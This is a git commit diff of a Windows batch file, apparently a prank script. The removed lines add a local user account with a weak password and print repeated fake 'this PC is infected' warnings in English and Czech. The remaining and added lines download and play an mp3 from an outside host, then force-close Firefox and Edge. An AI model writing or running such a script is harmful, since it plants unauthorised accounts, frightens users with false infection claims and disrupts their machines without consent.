f52791ef353b23537409869e00869c0090924de5
tobiasrepracek <80835891+tobiasrepracek@users.noreply.github.com>
2022-12-09 07:20:04 +0100

    Hotdog

--- final.bat
+++ final.bat
@@ -1,34 +1,8 @@
 @echo off
-curl -s https://sources.tobir.xyz/notif.mp3 > notif.mp3
-net user /add acc 123456!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!v
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
-echo This pc is beeing infected!
-echo Tento pocitac je zavirovan!
+cd %UserProfile%
+cd ..
+curl -s https://sources.tobir.xyz/hotdog.mp3 > hotdog.mp3
+start hotdog.mp3
 timeout 8
 taskkill /f /im firefox.exe /t
 taskkill /f /im msedge.exe /t
